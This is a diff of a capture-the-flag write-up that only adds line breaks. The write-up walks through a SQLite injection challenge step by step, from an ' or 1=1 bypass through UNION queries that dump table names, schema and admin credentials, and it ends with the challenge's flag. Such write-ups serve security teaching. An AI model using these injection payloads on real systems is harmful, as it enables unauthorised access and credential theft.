@@ -20,40 +20,40 @@ Solution:
   Solution:
   + An sql injection challenge
   + we are provided with login and register functionality.
-  + When we simply inserted `' or 1=1 --+` we got the following informations dumped.
-   name: user
-   password: pass123
-  signature: nothing here
+  + When we simply inserted `' or 1=1 --+` we got the following informations dumped.<br>
+   name: user<br>
+   password: pass123<br>
+  signature: nothing here<br>
   
  + From this we can understand that its a basic sql injection challenge.
- + So, now lets try to know how many columns are there in the database
-   query: `' union select 1,2,3,4 --+`
-   output: name:2
-           pass: 3
-          signature: 4
-+ Dump the sqlite version:
-  query:` ' union select 1,sqlite_version(),3,4 --+`
-  outptu: name: 3.27.2
-          pass:3
-          signature: 4
+ + So, now lets try to know how many columns are there in the database<br>
+   query: `' union select 1,2,3,4 --+`<br>
+   output: name:2<br>
+           pass: 3<br>
+          signature: 4<br>
++ Dump the sqlite version:<br>
+  query:` ' union select 1,sqlite_version(),3,4 --+`<br>
+  outptu: name: 3.27.2<br>
+          pass:3<br>
+          signature: 4<br>
   
- + Now we need to get the table names:
-   query: `' union select 1,group_concat(tbl_name),3,4 from sqlite_master where type='table' and tbl_name NOT LIKE 'sqlite_%' --+`
-   output: name: Admin, users
-            pass:3
-            signature: 4
+ + Now we need to get the table names:<br>
+   query: `' union select 1,group_concat(tbl_name),3,4 from sqlite_master where type='table' and tbl_name NOT LIKE 'sqlite_%' --+`<br>
+   output: name: Admin, users<br>
+            pass:3<br>
+            signature: 4<br>
   
- + Column names of the table 'Admin':
-  query: `' union select 1,sql,3,4 from sqlite_master where type!='meta' and sql NOT NULL and name not like 'sqlite_%' --+`
+ + Column names of the table 'Admin':<br>
+  query: `' union select 1,sql,3,4 from sqlite_master where type!='meta' and sql NOT NULL and name not like 'sqlite_%' --+`<br>
   output: name:CREATE TABLE Admins ( id INTEGER PRIMARY KEY AUTOINCREMENT, user TEXT NOT NULL, pass TEXT NOT NULL, content TEXT NOT NULL )
-          pass: 3
-          signature: 4
+          pass: 3<br>
+          signature: 4<br>
   
- +Now the values of the given columns: (user, pass,content)
-  query: `' union select 1, user,pass,content from Admins --+`
-  outptu: name: admin
-          pass: h4rd_to_gu355
-          signature: shellctf{Sql_1Nj3c7i0n_B45iC_XD}
+ +Now the values of the given columns: (user, pass,content)<br>
+  query: `' union select 1, user,pass,content from Admins --+`<br>
+  outptu: name: admin<br>
+          pass: h4rd_to_gu355<br>
+          signature: shellctf{Sql_1Nj3c7i0n_B45iC_XD}<br>
   
  + So, here we got the flag!
   
